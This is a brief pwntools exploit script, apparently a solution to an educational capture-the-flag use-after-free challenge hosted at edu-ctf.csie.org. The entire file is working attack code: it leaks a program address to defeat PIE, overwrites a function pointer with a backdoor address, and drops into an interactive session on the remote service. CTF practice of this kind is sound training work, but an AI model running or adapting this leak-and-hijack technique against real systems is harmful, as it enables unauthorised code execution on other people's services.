from pwn import *

context.arch = 'amd64'
#conn = process("./uaf")
conn = remote('edu-ctf.csie.org', 10177)

bye_func = 0xa77
backdoor = 0xab5


conn.sendafter('Size of your message: ', str(0x10))
conn.sendafter('Message: ', 'a'*8)

conn.recvuntil('a'*8)
pie = u64(conn.recv(6) + '\0\0') - bye_func
print(hex(pie))

conn.sendafter('Size of your message: ', str(0x10))
conn.sendafter('Message: ', 'a'*8 + p64(pie+backdoor))

conn.interactive()
